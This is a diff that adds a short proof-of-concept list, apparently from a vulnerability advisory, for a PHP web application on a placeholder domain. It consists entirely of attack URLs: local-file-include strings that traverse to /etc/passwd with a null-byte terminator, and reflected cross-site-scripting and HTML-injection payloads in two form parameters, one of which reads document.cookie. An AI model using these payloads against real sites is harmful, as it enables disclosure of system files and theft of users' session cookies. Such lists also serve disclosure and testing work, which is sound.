@@ -1,0 +1,11 @@
+For the local-file-include issues:
+http://www.example.com/ [Path] /index.php?webpages_form=../../../../../../../../../../../../../etc/passwd%00
+http://www.example.com/ [Path] /index.php?userman_form=../../../../../../../../../../../../../etc/passwd%00
+
+For the cross-site-scripting issues:
+http://www.example.com/ [Path] /index.php?userman_form=&lt;script&gt;alert(String.fromCharCode( 66, 89, 65, 76, 66, 65, 89, 88))&lt;/script&gt;
+http://www.example.com/ [Path] /index.php?webpages_form=&lt;script&gt;alert(String.fromCharCode( 66, 89, 65, 76, 66, 65, 89, 88))&lt;/script&gt;
+http://www.example.com/ [Path] /index.php?userman_form=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/ [Path] /index.php?webpages_form=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/ [Path] /index.php?userman_form=&#039;&gt;&lt;h1&gt;ByALBAYX&lt;/h1&gt;&lt;div style=display:none&gt;
+http://www.example.com/ [Path] /index.php?webpages_form=&#039;&gt;&lt;h1&gt;ByALBAYX&lt;/h1&gt;&lt;div style=display:none&gt;
